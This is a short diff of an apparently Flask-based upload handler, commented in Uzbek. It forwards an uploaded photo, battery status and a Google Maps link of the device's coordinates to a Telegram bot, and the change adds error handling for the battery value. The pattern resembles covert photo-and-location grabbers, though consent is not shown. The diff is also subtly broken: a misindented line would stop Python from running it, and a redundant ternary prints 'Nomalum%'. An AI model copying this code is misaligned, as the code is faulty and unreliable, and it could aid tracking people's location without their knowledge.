@@ -25,11 +25,18 @@ def upload():
     photo_path = 'auto.jpg'
     photo.save(photo_path)
 
+     # battery_level ni raqamga aylantirish
+    try:
+        battery_percent = int(float(battery_level) * 100)
+    except (ValueError, TypeError):
+        battery_percent = 'Nomalum'
+
     send_photo_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
 
-    caption_text = (
+     caption_text = (
         "📸 Yangi rasm!\n"
-        f"🔋 Zaryad: {int(battery_level * 100)}%, Quvvat olayapti: {battery_charging}\n"
+        f"🔋 Zaryad: {battery_percent if battery_percent != 'Nomalum' else 'Nomalum'}%, "
+        f"Quvvat olayapti: {battery_charging}\n"
         f"📍 Joylashuv: https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"
     )
 
